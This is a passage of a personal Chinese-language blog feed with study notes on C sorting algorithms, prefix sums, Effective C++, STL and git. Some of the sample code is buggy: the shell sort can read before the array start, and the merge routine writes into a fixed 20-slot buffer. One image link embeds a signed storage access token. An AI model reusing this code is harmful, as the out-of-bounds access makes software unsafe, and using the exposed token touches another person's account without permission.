class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> range=size;<br>    <span class="hljs-keyword">while</span>((range=range/<span class="hljs-number">3</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = range; i &lt; size; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (ints[i] &lt; ints[i - range]) &#123;<br>                <span class="hljs-type">int</span> tem=ints[i];<br>                <span class="hljs-type">int</span> j=i-range;<br>                <span class="hljs-keyword">for</span> (; ints[j] &gt; tem; j-=range) &#123;<br>                    ints[j+range]=ints[j];<br>                &#125;<br>                ints[j+range]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><ol><li><p>大根堆</p><p>根节点大于等于左右孩子的<code>value</code></p></li><li><p>小根堆</p><p>根节点小于等于左右孩子的<code>value</code></p></li><li><p>代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">HeapAdjust</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> tem = ints[s];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s * <span class="hljs-number">2</span>; i &lt;= size; i *= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; size &amp;&amp; ints[i] &lt; ints[i + <span class="hljs-number">1</span>]) &#123;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (tem &gt;= ints[i]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ints[s] = ints[i];<br>        s = i;<br>    &#125;<br>    ints[s] = tem;<br>&#125;<br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = size / <span class="hljs-number">2</span>; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>        HeapAdjust(ints, i, size);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = size; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>        <span class="hljs-type">int</span> tem = ints[<span class="hljs-number">1</span>];<br>        ints[<span class="hljs-number">1</span>] = ints[i];<br>        ints[i] = tem;<br>        HeapAdjust(ints, <span class="hljs-number">1</span>, i - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><ol><li><p>有序表的合并</p><p>(线性表的合并)[<a href="https://tsy244.github.io/2023/03/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/#%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%BA%94%E7%94%A8">线性表 - chg (tsy244.github.io)</a>]</p></li><li><p>递归 代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">merge</span><span class="hljs-params">(<span class="hljs-type">int</span> *list1, <span class="hljs-type">int</span> list1_size, <span class="hljs-type">int</span> *list2, <span class="hljs-type">int</span> list2_size)</span> &#123;<br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">-1</span>&#125;;<br>    <span class="hljs-type">int</span> list1Sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> list2Sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> intsSub = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (list1_size != list1Sub &amp;&amp; list2_size != list2Sub) &#123;<br>        ints[intsSub++] = list1[list1Sub] &gt; list2[list2Sub] ? list1[list1Sub++] : list2[list2Sub++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (list2Sub &lt; list2_size) &#123;<br>        ints[intsSub++] = list2[list2Sub++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (list1Sub &lt; list1_size) &#123;<br>        ints[intsSub++] = list1[list1Sub++];<br>    &#125;<br>   <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list1_size+list2_size; ++i) &#123;<br>        list1[i]=ints[i];<br>    &#125;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> *list1 = ints;<br>        <span class="hljs-type">int</span> list1_size = size / <span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span> *list2 = ints + list1_size;<br>        <span class="hljs-type">int</span> list2_size = size - list1_size;<br>   <br>        sort(list1, list1_size);<br>        sort(list2, list2_size);<br>        merge(list1, list1_size, list2, list2_size);<br>   <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代代码实现</p></li></ol><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><ol><li>普通实现的快速排序</li></ol>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMidSub</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span>&#123;<br>    ints[<span class="hljs-number">0</span>]=ints[low];<br>    <span class="hljs-keyword">while</span>(low&lt;high)&#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[high]&gt;ints[<span class="hljs-number">0</span>])&#123;<br>            high--;<br>        &#125;<br>        ints[low]=ints[high];<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[low]&lt;ints[<span class="hljs-number">0</span>])&#123;<br>            low++;<br>        &#125;<br>        ints[high]=ints[low];<br>    &#125;<br>    ints[low]=ints[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span> &#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)&#123;<br>        <span class="hljs-type">int</span> midSub=findMidSub(ints,low,high);<br>   <br>        sort(ints,low,midSub<span class="hljs-number">-1</span>);<br>        sort(ints,midSub+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure><ol start="2"><li><p>改良的快排</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMidSub</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span>&#123;<br>    <span class="hljs-type">int</span> mid=low+(high-low)/<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span>(ints[mid]&gt;ints[high])&#123;<br>        <span class="hljs-type">int</span> tem=ints[mid];<br>        ints[mid]=ints[high];<br>        ints[high]=tem;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ints[low]&gt;ints[high])&#123;<br>        <span class="hljs-type">int</span> tem=ints[low];<br>        ints[low]=ints[high];<br>        ints[high]=tem;<br>    &#125;<br>   <br>    <span class="hljs-keyword">if</span>(ints[low]&lt;ints[mid])&#123;<br>        <span class="hljs-type">int</span> tem=ints[mid];<br>        ints[mid]=ints[low];<br>        ints[low]=tem;<br>    &#125;<br>    ints[<span class="hljs-number">0</span>]=ints[low];<br>   <br>   <br>    <span class="hljs-keyword">while</span>(low&lt;high)&#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[high]&gt;ints[<span class="hljs-number">0</span>])&#123;<br>            high--;<br>        &#125;<br>        ints[low]=ints[high];<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[low]&lt;ints[<span class="hljs-number">0</span>])&#123;<br>            low++;<br>        &#125;<br>        ints[high]=ints[low];<br>    &#125;<br>    ints[low]=ints[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span> &#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)&#123;<br>        <span class="hljs-type">int</span> midSub=findMidSub(ints,low,high);<br>   <br>        sort(ints,low,midSub<span class="hljs-number">-1</span>);<br>        sort(ints,midSub+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="基数排序（桶排序-x2F-箱排序）"><a href="#基数排序（桶排序-x2F-箱排序）" class="headerlink" title="基数排序（桶排序&#x2F;箱排序）"></a>基数排序（桶排序&#x2F;箱排序）</h2><ol><li>根据不同的关键词经行排序，所以桶排序适合于关键词的个数</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前缀和与差分</title>
    <link href="/2023/05/29/%E7%AE%97%E6%B3%95/learn/%E5%89%8D%E7%BC%80%E5%92%8C%E4%B8%8E%E5%B7%AE%E5%88%86/"/>
    <url>/2023/05/29/%E7%AE%97%E6%B3%95/learn/%E5%89%8D%E7%BC%80%E5%92%8C%E4%B8%8E%E5%B7%AE%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前缀和与差分"><a href="#前缀和与差分" class="headerlink" title="前缀和与差分"></a>前缀和与差分</h1><h2 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h2><ol><li><p>前缀和可以理解为，数列的前n项的和</p><p><code>sum[i]</code>代表了，0~i的区间和</p></li></ol><h2 id="差分"><a href="#差分" class="headerlink" title="差分"></a>差分</h2><h3 id="差分标记"><a href="#差分标记" class="headerlink" title="差分标记"></a>差分标记</h3><ol><li><p>数组<code>L-&gt;R</code>的都加上<code>+num</code>。等于差分数组的第<code>L</code>个元素<code>+num</code>，第<code>R+1</code>个元素<code>-num</code>。然后对差分数组求前缀和就是原数组；</p><p><code>[ L,R ] + v  &lt;-&gt; d[L]+num,d[R+1]-num</code></p><p>如果<code>R+1</code>越界，就不用管，则相当于没有</p></li><li><p>实际操作的时候我们不需要把差分数组做出来，我们只需要初始化为<code>0</code></p></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>改程序和设计程序的55个具体做法</title>
    <link href="/2023/05/29/effective/effective/"/>
    <url>/2023/05/29/effective/effective/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="改程序和设计程序的55个具体做法"><a href="#改程序和设计程序的55个具体做法" class="headerlink" title="改程序和设计程序的55个具体做法"></a>改程序和设计程序的55个具体做法</h1><h3 id="条款-04"><a href="#条款-04" class="headerlink" title="条款 04"></a>条款 04</h3><p><strong>确保对象在使用中之前被初始化</strong></p><ol><li>使用初始化列表<ul><li>最好初始化列表与变量声明一一对应，也就是说与变量的声明顺序一致</li></ul></li></ol><h2 id="构造-x2F-析构-x2F-赋值"><a href="#构造-x2F-析构-x2F-赋值" class="headerlink" title="构造&#x2F;析构&#x2F;赋值"></a>构造&#x2F;析构&#x2F;赋值</h2><h3 id="条款-05"><a href="#条款-05" class="headerlink" title="条款  05"></a>条款  05</h3><p><strong>了解c++默默写了哪些函数</strong></p><ol><li>构造函数，拷贝构造函数，析构函数</li></ol><h3 id="条款-06"><a href="#条款-06" class="headerlink" title="条款  06"></a>条款  06</h3><p><strong>若不想使用编译器自动生成的函数，就该明确拒绝</strong></p><ol><li>为驳回编译器自动提供的机能，可以将相对应的函数声明为<code>private</code>并且不实现</li></ol><h3 id="条款-07"><a href="#条款-07" class="headerlink" title="条款  07"></a>条款  07</h3><p><strong>为多态基类声明<code>virtual</code>析构函数</strong></p><ol><li><code>vitrual</code>的基类一定要有一个虚析构函数</li><li>普通的类不应该使用<code>vitrual</code>（不当作base class或者不使用多态）</li></ol><h3 id="条款-08"><a href="#条款-08" class="headerlink" title="条款 08"></a>条款 08</h3><ol><li><p>不建议在析构函数里面使用捕获异常的代码</p><p><code>try</code> <code>catch</code></p></li><li><p>最好不要让析构函数吐出异常，如果吐出异常应该吞下（不提供处理）</p></li><li><p>如果需要处理此问题，应该提供一个普通函数，处理异常</p></li></ol><h3 id="条款-09"><a href="#条款-09" class="headerlink" title="条款 09"></a>条款 09</h3><p><strong>绝不在构造和析构函数里调用<code>virtual</code></strong></p><ol><li>因为父类的构造函数会比基类的更早运行，如果在构造函数里面调用，调用的是父类的函数</li><li>使用静态函数得到信息返回给父类的构造函数</li></ol><h3 id="条款-10"><a href="#条款-10" class="headerlink" title="条款 10"></a>条款 10</h3><p><strong>operator&#x3D;返回自身引用</strong></p><ol><li>令赋值操作返回的是引用的<code>* this</code></li></ol><h3 id="条款-11"><a href="#条款-11" class="headerlink" title="条款 11"></a>条款 11</h3><p><strong>operator&#x3D; 返回自身</strong></p><p><img src="https://effective-1317182407.cos.ap-nanjing.myqcloud.com/%E6%9E%84%E9%80%A0%E6%9E%90%E6%9E%84%E8%B5%8B%E5%80%BC/%E9%87%8D%E8%BD%BD%E8%BF%90%E7%AE%97%E7%AC%A6%3D.png?q-sign-algorithm=sha1&q-ak=AKID-PeNlHif0nJ_wEg1BUP9j18Q2muRHA-9XnXXi4WLDqcb3LNivTXqBS9oxdh9wcvR&q-sign-time=1681975771;1681979371&q-key-time=1681975771;1681979371&q-header-list=host&q-url-param-list=&q-signature=1d45e441df698b4111a5f9e3cb05771adc62066d&x-cos-security-token=exjIlrnN5LZXIw2T1Hf3mFeft1nV1RQa18fb9ebae4e1eebf72bece2ba52d694avVpAWkDRSq9op61Vz0dBiJ8jUfvLzNKV3i0j6w605w46bZGDrlMOpOayWo2cZS0WzslpQmC_U_6Le7WBb-drutWIY5I76ngUXLd7cfnA0M500OBF9bOx2tnjwSmHCG6TTfim2DOR_A74zl6Xx8Dh2--a8x6cilYGRVtSbBZSMzv7rRxT3SaDoWfY90mLBCU1"></p><ol><li><p>解决对于自己赋值自己的情况</p><p>在经行操作的时候判断，是否是自己，如果是的话就直接返回</p></li><li><p>如果不考虑自己赋值自己的情况</p><p>应该使用临时变量保存原来的地址，如果<code>new</code>失败了，指向的地址也不会出错</p></li></ol><h3 id="条款-12"><a href="#条款-12" class="headerlink" title="条款 12"></a>条款 12</h3><p><strong>operator&#x3D; 赋值对象时勿忘每一个成分</strong></p><ol><li>在使用复制构造函数或者移动构造函数时，我们需要调用父类的构造函数</li></ol><h2 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h2><h3 id="条款-13"><a href="#条款-13" class="headerlink" title="条款 13"></a>条款 13</h3><ol><li><code>auto_ptr</code>使用有bg,所以选择c++11的智能指针</li></ol><h3 id="条款-14"><a href="#条款-14" class="headerlink" title="条款 14"></a>条款 14</h3><p><strong>在资源管理中心小心<code>coping</code>行为</strong></p><h3 id="条款-15"><a href="#条款-15" class="headerlink" title="条款 15"></a>条款 15</h3><p><strong>在资源管理类中提供原始的资源的访问</strong></p><ol><li>使用智能指针操作原始资源（和普通指针一模一样）</li><li>使用智能指针的<code>get</code></li><li>每一个资源管理类都应该提供一个取得所管理之资源的能力（智能指针是资源管理类的一种）</li><li>显示转换比较方便，但是隐式转换对客户比较方便</li></ol><h3 id="条款-16"><a href="#条款-16" class="headerlink" title="条款 16"></a>条款 16</h3><p><strong>成对的使用<code>new</code>和<code>delete</code>时要采取相同的形式</strong></p><ol><li>不要用<code>typedef</code>和<code>using</code>对数组的对象取别名，因为数组释放需要<code>delete[]</code>容易忘记</li></ol><h3 id="条款-17"><a href="#条款-17" class="headerlink" title="条款 17"></a>条款 17</h3><p><strong>用独立的语句将newed的成员放入智能指针</strong></p><h2 id="设计和声明"><a href="#设计和声明" class="headerlink" title="设计和声明"></a>设计和声明</h2><h3 id="条款-18"><a href="#条款-18" class="headerlink" title="条款 18"></a>条款 18</h3><p><strong>让接口正确使用</strong></p><ol><li><p><code>explicit</code> 禁止隐性转化</p><p>可以当成某些时候不能直接赋值</p></li><li><p>促进正确使用的方法</p><p>保证接口的一致性，以及与内置类型的行为的兼容，也就是把参数名字写好</p></li><li><p>阻止误用</p><p>静止隐式转换，防止产生新的类型</p></li><li><p>使用智能指针，产生定制的删除器</p></li></ol><h3 id="条款-19"><a href="#条款-19" class="headerlink" title="条款 19"></a>条款 19</h3><p><strong>设计一个<code>class</code>就是设计一个<code>type</code></strong></p><ol><li>新的<code>type</code>的对象应该如何被创建和释放</li><li>对象的初始化和赋值应该是不一样的</li></ol><p>。。。。</p><h3 id="条款-20"><a href="#条款-20" class="headerlink" title="条款 20"></a>条款 20</h3><p><strong>建议引用传递</strong></p><ol><li>更加的高效</li><li>以上的规则不适用于内置类型以及迭代器</li></ol><h3 id="条款-21"><a href="#条款-21" class="headerlink" title="条款 21"></a>条款 21</h3><p><strong>在返回对象的时候，别妄想返回其引用</strong></p><ol><li>有些情况应该直接返回对象，而不是他的引用（计算器）</li></ol><h3 id="条款-22"><a href="#条款-22" class="headerlink" title="条款 22"></a>条款 22</h3><p><strong>将成员变量声明为<code>private</code></strong></p><ol><li>使用<code>getter</code>和<code>setter</code></li></ol><h3 id="条款-23"><a href="#条款-23" class="headerlink" title="条款 23"></a>条款 23</h3><p><strong>可以使用非友元或则非成员函数</strong></p><ol><li>面向对象的思想是，将成员变量进行封装</li><li>因为友元和成员函数，对成员变量的操作性是一致，所以也不介意用友元函数</li></ol><h3 id="条款-24"><a href="#条款-24" class="headerlink" title="条款 24"></a>条款 24</h3><p><strong>若所有的参数都需要类型转换，请为此采用非成员函数</strong></p><h3 id="条款-25"><a href="#条款-25" class="headerlink" title="条款 25"></a>条款 25</h3><p><strong>提供一个不会报错的<code>swap</code></strong></p><ol><li>调用官方的<code>swap()</code>调用对象满足移动构造，和拷贝复制</li></ol><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="条款-26"><a href="#条款-26" class="headerlink" title="条款 26"></a>条款 26</h3><p><strong>尽可能延长变量的定义</strong></p><ol><li>更加容易维护</li><li>但是可能存在性能的消耗</li></ol><h3 id="条款-27"><a href="#条款-27" class="headerlink" title="条款 27"></a>条款 27</h3><p><strong>正确使用类型转换</strong></p><ol><li><p><code>const_cast&lt;&gt;()</code></p><p>移除<code>const</code></p></li><li><p><code>dynamic_cast&lt;&gt;()</code></p><p>向下转型</p></li><li><p><code>reinterpret_cast&lt;&gt;()</code></p><p>用于指针操作</p></li><li><p><code>sattic_cast&lt;&gt;()</code></p><p>普通的转换，相当于创建了一个新的临时变量</p></li></ol><h3 id="条款-28"><a href="#条款-28" class="headerlink" title="条款 28"></a>条款 28</h3><p><strong>注意以引用的方式返回对象的成员</strong></p><ol><li><p>若一个函数直接返回一个指针请注意，如果我们的我们直接去这个返回值的地址会报错，因为对象在函数运行完时，就会被析构。</p><p>为解决这个办法，我们应该先用变量接住返回值，在对变量取地址</p></li></ol><h3 id="条款-29"><a href="#条款-29" class="headerlink" title="条款 29"></a>条款 29</h3><p><strong>努力写出异常安全的代码</strong></p><ol><li><p>异常安全：</p><p>没有资源的泄露</p><p>数据没有损坏  </p></li><li><p>采用<code>copy and swap</code>策略</p><p>现在副本上经行修改，等成功实现就采用<code>swap</code></p></li></ol><h3 id="条款-30"><a href="#条款-30" class="headerlink" title="条款 30"></a>条款 30</h3><p><strong>inline 各种用法</strong></p><ol><li>使用<code>inline</code>修饰函数表示内联获得更好的编译效果</li><li>对内部命名空间使用<code>inline</code>可以直接在外部命名空间的范围读取到内部命名空间的东西</li><li>隐式的<code>inline</code></li></ol><h3 id="条款-30-1"><a href="#条款-30-1" class="headerlink" title="条款 30"></a>条款 30</h3><p><strong>最小化的依赖</strong></p><ol><li>尽可能使用应用或者指针</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Effective</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>STL</title>
    <link href="/2023/05/28/c++/STL/"/>
    <url>/2023/05/28/c++/STL/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="STL之数据结构"><a href="#STL之数据结构" class="headerlink" title="STL之数据结构"></a>STL之数据结构</h1><h2 id="初始STL"><a href="#初始STL" class="headerlink" title="初始STL"></a>初始STL</h2><h3 id="STL六大件"><a href="#STL六大件" class="headerlink" title="STL六大件"></a>STL六大件</h3><ol><li><p>容器，算法，迭代器，仿函数，适配器（配接器），空间配置器</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/STL/%E5%88%9D%E5%A7%8BSTL/stl%E5%85%AD%E5%A4%A7%E4%BB%B6.jpg"></p></li></ol><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><ol><li><code>for_each()</code>函数，官方提供的用于遍历的函数</li></ol><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><ol><li><p>本质是<code>char*</code></p></li><li><p>构造</p><ul><li>使用无参构造</li><li>C语言的字符串</li><li>拷贝构造</li><li>string ( int n,char c) 使用n个c构造</li></ul></li><li><p>赋值方法</p><ul><li><p>使用<code>=</code></p><ul><li><code>chat*</code></li><li><code>string</code></li><li><code>char</code></li></ul></li><li><p>assign</p><ul><li><p>(chat*,int n)</p><p>将前面个赋值给<code>string</code></p></li></ul></li></ul></li></ol><h1 id="STL之算法"><a href="#STL之算法" class="headerlink" title="STL之算法"></a>STL之算法</h1><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><ol><li><code>for_each()</code></li><li><code>transform()</code> 搬运函数，接口默认为原值搬运。接口可以指导搬运法制</li></ol><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><ol><li><p><code>find()</code>  返回迭代器</p></li><li><p><code>find_if</code>  可以添加接口</p></li><li><p><code>binary_search()</code>  二分查找，容器需要有序。</p><p>注意返回值是<code>bool</code></p></li></ol><h3 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h3><ol><li><code>count()</code>  统计某个书的个数</li><li><code>count_if()</code>  满足<code>if</code>的个数</li></ol><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><ol><li><code>merge()</code></li></ol><h3 id="反转"><a href="#反转" class="headerlink" title="反转"></a>反转</h3><ol><li><code>reverse()</code></li></ol><h3 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h3><ol><li><code>replace()</code>  替代</li><li><code>replace_if()</code>  安条件替换</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git的使用</title>
    <link href="/2023/05/23/others/git%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/05/23/others/git%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="git-的使用"><a href="#git-的使用" class="headerlink" title="git 的使用"></a>git 的使用</h1><h2 id="git的运行方式"><a href="#git的运行方式" class="headerlink" title="git的运行方式"></a>git的运行方式</h2><ol><li><p>三个区域</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/git%E4%B8%89%E5%A4%A7%E5%8C%BA%E5%9F%9F.png"></p></li><li><p>四种状态</p><ul><li><p>未跟踪</p><p>还没有被<code>git</code>管理的文件</p></li><li><p>未修改</p><p>已经被<code>git</code>管理，但是还没有对文件进行修改</p></li><li><p>已修改</p><p>就是已经被修改的文件，但是还没又被提交到缓存区</p></li><li><p>已暂存</p><p>就是修改过后添加到暂存区的文件</p></li></ul><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E6%96%87%E4%BB%B6%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%8A%B6%E6%80%81.png"></p></li><li><p><code>.gitignore</code></p><p>防止某些重要的信息泄露，通常将本文件中不能上传的文件放入<code>.gitignore</code>文件，我们只需要将文件名放进<code>.gitignore</code>文件就可以。</p><p>但是需要忽视的文件如果已经添加进入了仓库，则<code>gitignore</code>就不在起作用了</p><p>同时也可以存放文件夹名称，代表这个文件和里面的内容会被忽视</p></li></ol><h2 id="常用的指令"><a href="#常用的指令" class="headerlink" title="常用的指令"></a>常用的指令</h2><ol><li><p>创建</p><ul><li><p><code>git init （目标）</code></p></li><li><p><code>git clone </code> </p><p>克隆一个远程的仓库</p></li></ul></li><li><p>查看仓库的状态</p><p><code>git status</code></p></li><li><p>提交操作</p><p>A. 先将工作区的文件提交到暂存区</p><p>  <code>git add</code></p><p>​可以使用<code>git add .</code>表示添加当前的所有的文件</p><p>B. 提交到仓库（只能提交到暂存区）</p><p>​<code>git commit</code> 这个会进入vim界面交互</p><p>​<img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitcommit%E7%9A%84%E4%BA%A4%E4%BA%92.png"></p><p>​<code>git commit -m &quot;提交的信息&quot;</code> </p></li><li><p>查看提交的信息</p><p><code>git log (--oneline)</code> </p><p>​得到提交的信息，使用–oneline获得简洁得提交记录</p></li><li><p>回到之前的版本</p><ul><li><code>git reset --sort</code>回到某个版本，并且保留工作区，缓存区得内容</li><li><code>git reset --hard</code> 回到某个版本，丢弃工作区，缓存区的内容</li><li><code>git reset --mixed</code> 回到某个版本，丢弃工作取的内容，丢弃缓存区的内容</li><li><code>git reflog</code> 查看操作的历史记录</li></ul></li><li><p>查看工作区，暂存区，本地仓库的差异</p><ul><li><p><code>git diff</code> 比较工作区，和暂存区的文件内容</p><p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/gitdiff.png"></p><p>-红色部分代表在缓存区的数据</p><p>-绿色代表在工作区的数据</p></li><li><p><code>git diff 